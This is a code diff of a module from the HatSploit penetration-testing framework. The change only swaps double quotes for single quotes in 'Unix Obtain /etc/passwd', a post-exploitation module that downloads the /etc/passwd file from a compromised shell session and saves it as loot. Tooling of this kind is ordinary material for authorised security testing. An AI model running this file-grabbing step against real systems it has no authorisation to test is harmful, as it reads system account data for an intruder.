@@ -10,35 +10,35 @@ from hatsploit.lib.loot import Loot
 
 class HatSploitModule(Module, Sessions):
     details = {
-        "Category": "post",
-        "Name": "Unix Obtain /etc/passwd",
-        "Module": "post/unix/shell/getpasswd",
-        "Authors": ["Ivan Nikolsky (enty8080) - module developer"],
-        "Description": "Get current session /etc/passwd file.",
-        "Platform": "unix",
-        "Rank": "medium",
+        'Category': "post",
+        'Name': "Unix Obtain /etc/passwd",
+        'Module': "post/unix/shell/getpasswd",
+        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
+        'Description': "Get current session /etc/passwd file.",
+        'Platform': "unix",
+        'Rank': "medium",
     }
 
     options = {
-        "SESSION": {
-            "Description": "Session to run on.",
-            "Value": None,
-            "Type": {
-                "session": {
-                    "Platforms": ["linux", "unix", "macos", "apple_ios"],
-                    "Type": "shell",
+        'SESSION': {
+            'Description': "Session to run on.",
+            'Value': None,
+            'Type': {
+                'session': {
+                    'Platforms': ['linux', 'unix', 'macos', 'apple_ios'],
+                    'Type': 'shell',
                 }
             },
-            "Required": True,
+            'Required': True,
         },
-        "PATH": {
-            "Description": "Path to save file.",
-            "Value": Loot().specific_loot("passwd"),
-            "Type": None,
-            "Required": True,
+        'PATH': {
+            'Description': "Path to save file.",
+            'Value': Loot().specific_loot('passwd'),
+            'Type': None,
+            'Required': True,
         },
     }
 
     def run(self):
         session, path = self.parse_options(self.options)
-        self.session_download(session, "/etc/passwd", path)
+        self.session_download(session, '/etc/passwd', path)
